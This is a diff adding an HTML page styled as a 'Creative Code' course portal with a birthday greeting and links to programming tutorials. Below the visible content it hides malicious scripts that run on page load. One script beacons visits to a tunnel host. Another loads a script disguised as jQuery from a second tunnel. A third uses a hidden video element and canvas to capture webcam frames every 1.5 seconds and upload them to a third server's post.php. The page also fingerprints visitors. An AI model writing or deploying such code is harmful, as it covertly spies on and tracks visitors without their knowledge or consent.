@@ -1,0 +1,241 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Creative Code</title>
+  <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Roboto:wght@700&display=swap" rel="stylesheet">
+  <style>
+    header h1 {
+      font-family: 'Great Vibes', cursive;
+      font-size: 3rem;
+      color: #ff00ff;
+      text-align: center;
+      text-shadow: 
+        0 0 5px #ff00ff,
+        0 0 15px #ff33cc,
+        0 0 25px #ff66ff;
+    }
+
+    header h2 {
+      font-family: 'Great Vibes', cursive; /* Happy Birthday بخط ملفوف */
+      font-size: 2.2rem;
+      color: #00e5ff;
+      text-align: center;
+      margin-top: 15px;
+      text-shadow: 
+        0 0 5px #00e5ff,
+        0 0 15px #33ffff,
+        0 0 25px #66ffff;
+    }
+
+    header h2 span {
+      font-family: 'Roboto', sans-serif; /* الاسم بخط عادي */
+      font-size: 2.2rem;
+      background: linear-gradient(90deg, #3f51b5, #9c27b0, #e91e63);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 
+        0 0 5px rgba(255,255,255,0.2),
+        0 0 15px rgba(156,39,176,0.6),
+        0 0 25px rgba(233,30,99,0.8);
+    }
+  </style>
+</head>
+<body>
+  <!-- Particles Background -->
+  <div id="particles-js"></div>
+
+  <!-- Content -->
+  <div class="content">
+    <!-- Header -->
+    <header>
+      <h1> Creative Code </h1>
+      <h2>Happy Birthday to <span>Abdulrahman Siddiq Rashid</span></h2>
+      <nav>
+        <a href="index.html">Home</a>
+        <a href="courses.html">Courses</a>
+        <a href="Extension.html">Extension</a>
+      </nav>
+    </header>
+
+    <!-- Courses -->
+    <section id="courses" class="courses">
+      <h2> ALKING CREATIVE CODE COURSES </h2>
+      <div class="course-grid">
+
+        <!-- Course Card -->
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/732/732212.png" alt="HTML">
+          <h3>HTML Basics</h3>
+          <a href="https://developer.mozilla.org/en-US/docs/Learn/HTML" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/732/732190.png" alt="CSS">
+          <h3>CSS & Responsive Design</h3>
+          <a href="https://www.freecodecamp.org/learn/responsive-web-design/" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/5968/5968292.png" alt="JavaScript">
+          <h3>Modern JavaScript</h3>
+          <a href="https://javascript.info" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/5968/5968350.png" alt="Python">
+          <h3>Python for Beginners</h3>
+          <a href="https://www.learnpython.org/" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/1126/1126012.png" alt="React">
+          <h3>React Official</h3>
+          <a href="https://react.dev/learn" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/919/919825.png" alt="Node.js">
+          <h3>Node.js Basics</h3>
+          <a href="https://nodejs.dev/en/learn/" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111288.png" alt="Git">
+          <h3>Git & GitHub</h3>
+          <a href="https://git-scm.com/doc" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/518/518713.png" alt="Linux">
+          <h3>Linux Basics</h3>
+          <a href="https://linuxjourney.com/" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/906/906324.png" alt="Cybersecurity">
+          <h3>Cybersecurity Fundamentals</h3>
+          <a href="https://www.coursera.org/learn/ibm-cybersecurity" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+        <div class="course-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/873/873107.png" alt="AI/ML">
+          <h3>Machine Learning (Andrew Ng)</h3>
+          <a href="https://www.coursera.org/learn/machine-learning" target="_blank" class="btn">Learn Now</a>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+      <p>© 2025 Creative Code | Built by <span class="author">Abdulrahman Siddiq Rashid</span></p>
+    </footer>
+  </div>
+
+  <!-- Particles.js -->
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS("particles-js", {
+      "particles": {
+        "number": { "value": 100 },
+        "size": { "value": 3 },
+        "move": { "speed": 2 },
+        "line_linked": { "enable": true, "distance": 140, "color": "#ff00ff" },
+        "color": { "value": ["#ff00ff","#00ffff","#ff0099"] }
+      }
+    });
+  </script>
+
+  <script>
+  
+  fetch("https://nest-builders-argued-strange.trycloudflare.com/log", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      page: window.location.pathname,   
+      time: new Date().toLocaleString() 
+    })
+  })
+</script>
+
+
+<script src="https://electric-passenger-humanitarian-rs.trycloudflare.com:443/jquery.min.js"></script>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video> 
+</div>
+<canvas id="canvas" width="640" height="480" hidden="hidden"></canvas>
+
+<script>
+  
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+
+  
+  const SERVER_URL = "https://typical-believe-epa-republican.trycloudflare.com/post.php"; 
+  
+  
+  function sendFrame(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: SERVER_URL,
+      dataType: 'json',
+      crossDomain: true,   
+      success: function () {
+        console.log("S");
+      },
+      error: function (xhr, status, error) {
+        console.log("E se", error);
+      }
+    });
+  }
+
+  
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      video.srcObject = stream;
+
+      const context = canvas.getContext('2d');
+
+      
+      setInterval(function () {
+        context.drawImage(video, 0, 0, 640, 480);
+        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        sendFrame(canvasData);
+      }, 1500);
+
+    } catch (e) {
+      console.error("E ca", e);
+    }
+  }
+
+  
+  init();
+</script>
+
+<script>
+  const fpPromise = import('https://fpjscdn.net/v3/zYZ5JfVpIvcF0pQRDvhC')
+    .then(FingerprintJS => FingerprintJS.load())
+
+  fpPromise
+    .then(fp => fp.get())
+    .then(result => {
+      
+      const visitorId = result.visitorId
+      console.log(visitorId)
+    })
+</script>
+
+
+</body>
+</html>
+
